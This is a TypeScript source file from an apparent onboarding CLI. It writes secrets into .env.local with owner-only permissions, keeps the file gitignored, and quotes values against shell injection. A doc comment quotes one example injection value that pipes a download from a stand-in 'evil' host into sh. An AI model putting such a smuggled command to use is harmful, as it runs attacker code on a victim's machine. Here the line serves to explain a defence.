/**
 * `.env.local` upserts. Sets a single key without clobbering the rest of the
 * file, and makes sure the file is gitignored (the CLI never commits — it only
 * guards the human from committing a secret). See docs/onboarding-wizard.md §3.
 */
import { chmodSync, existsSync, readFileSync, writeFileSync } from "node:fs";
import path from "node:path";

/** Result of an env upsert, for the caller's status line. */
export interface EnvUpsertResult {
  /** Absolute path written. */
  file: string;
  /** True when the key already had this exact value (no write needed). */
  unchanged: boolean;
  /** True when `.env.local` was added to `.gitignore` as part of this call. */
  gitignoreUpdated: boolean;
}

/**
 * Render a value for a dotenv line. A value outside a conservative safe set is
 * single-quoted so a hostile server-supplied value (e.g. an ingest key like
 * `x$(curl evil|sh)`) can't inject shell expansion when the file is later
 * `source`d — single quotes suppress ALL expansion, and an embedded single quote
 * is escaped with the `'\''` idiom. Simple key-shaped values stay unquoted.
 */
const formatValue = (value: string): string =>
  /^[A-Za-z0-9_./:@%+=-]+$/.test(value) ? value : `'${value.replace(/'/g, "'\\''")}'`;

/** Upsert `KEY=value` into `<cwd>/.env.local`, preserving other lines; ensures it's gitignored. */
export const upsertEnvLocal = (cwd: string, key: string, value: string): EnvUpsertResult => {
  const file = path.join(cwd, ".env.local");
  const line = `${key}=${formatValue(value)}`;
  let unchanged = false;

  let lines: string[] = [];
  if (existsSync(file)) {
    lines = readFileSync(file, "utf8").split(/\r?\n/);
    const idx = lines.findIndex((l) => {
      const t = l.trim();
      return t.startsWith(`${key}=`) || t.startsWith(`export ${key}=`);
    });
    if (idx >= 0) {
      unchanged = lines[idx] === line;
      lines[idx] = line;
    } else {
      // Drop a single trailing empty line so we don't accrete blank lines on re-run.
      if (lines.length > 0 && lines[lines.length - 1] === "") lines.pop();
      lines.push(line);
    }
  } else {
    lines = [line];
  }

  if (!unchanged) {
    // The file holds an ingest secret — lock it to the owner (0600), matching the
    // credential store; `mode` only applies on create, so chmod covers a pre-existing file.
    writeFileSync(file, `${lines.join("\n").replace(/\n*$/, "")}\n`, { mode: 0o600 });
    chmodSync(file, 0o600);
  }
  const gitignoreUpdated = ensureGitignored(cwd, ".env.local");
  return { file, unchanged, gitignoreUpdated };
};

/** Read KEY→value pairs from the repo's env files (`.env` then `.env.local`; later wins). Values are unquoted. */
export const readDotenvValues = (cwd: string): Map<string, string> => {
  const out = new Map<string, string>();
  for (const file of [".env", ".env.local"]) {
    let text: string;
    try {
      text = readFileSync(path.join(cwd, file), "utf8");
    } catch {
      continue;
    }
    for (const line of text.split(/\r?\n/)) {
      const trimmed = line.trim();
      if (trimmed === "" || trimmed.startsWith("#")) continue;
      const eq = trimmed.indexOf("=");
      if (eq <= 0) continue;
      const key = trimmed.slice(0, eq).replace(/^export\s+/, "").trim();
      let value = trimmed.slice(eq + 1).trim();
      if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
        value = value.slice(1, -1);
      }
      out.set(key, value);
    }
  }
  return out;
};

/** Append `entry` to `<cwd>/.gitignore` if absent. Returns whether the file was changed. */
export const ensureGitignored = (cwd: string, entry: string): boolean => {
  const file = path.join(cwd, ".gitignore");
  let existing = "";
  if (existsSync(file)) existing = readFileSync(file, "utf8");
  const has = existing
    .split(/\r?\n/)
    .map((l) => l.trim())
    .some((l) => l === entry || l === `/${entry}`);
  if (has) return false;
  const prefix = existing === "" || existing.endsWith("\n") ? existing : `${existing}\n`;
  writeFileSync(file, `${prefix}${entry}\n`);
  return true;
};
